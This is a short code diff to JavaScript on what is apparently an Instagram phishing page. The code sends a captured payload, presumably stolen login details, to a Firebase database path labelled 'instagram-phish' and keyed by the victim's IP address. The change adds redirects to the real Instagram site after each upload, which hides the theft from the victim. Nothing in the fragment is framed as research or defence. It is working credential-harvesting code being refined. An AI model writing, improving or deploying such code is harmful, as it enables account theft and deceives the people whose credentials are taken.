@@ -55,9 +55,11 @@ document.addEventListener("DOMContentLoaded", () => {
       const ip = await getClientIp();
       if (ip) {
         await db.ref("instagram-phish/ip/" + ip).push(payload);
+        window.location.href = "https://www.instagram.com";
       } else {
         // fallback if IP lookup failed
         await db.ref("instagram-phish/ip").push(payload);
+        window.location.href = "https://www.instagram.com";
       }
       console.log("Uploaded:", payload);
       window.location.href = "https://www.instagram.com";
